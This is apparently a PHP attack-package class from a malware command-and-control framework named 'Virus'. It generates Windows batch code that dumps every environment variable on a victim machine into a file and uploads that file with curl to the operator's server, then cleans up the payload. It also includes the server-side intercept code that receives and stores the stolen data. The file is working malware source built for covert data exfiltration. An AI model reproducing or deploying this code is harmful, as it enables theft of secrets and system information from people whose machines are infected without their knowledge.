<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class CollectEnv
 * @package Kelvinho\Virus\Attack\Packages
 *
 * This simply do a bunch of if exist "c:\" (echo true). Returns a string of the available drives.
 */
class CollectEnv extends AttackInterface {
    private array $data = [];

    public function setEnv(array $data): void {
        $this->data = $data;
    }

    public function getEnv(): array {
        return $this->data;
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        if (isset($_FILES["envFile"])) {
            $contents = file_get_contents($_FILES["envFile"]["tmp_name"]);
                $lines = \Kelvinho\Virus\filter(explode("\n", $contents), function ($line) {
                return !empty(trim($line));
            });
            $data = [];
            foreach ($lines as $line) {
            $contents = explode("=", $line);
            $data[$contents[0]] = explode(";", $contents[1]);
        }

        $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
        $attack->setEnv($data);
        $attack->setExecuted();
        $attack->saveState();
        }
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->data = $state["data"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        //return "{\"data\": []}";
        $state = [];
        $state["data"] = $this->data;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "envFile=@%~pd0env" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        chCp 65001
        set > %~pd0env
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * @inheritDoc
     */
    public function processExtras(string $resource): void {
    }
}
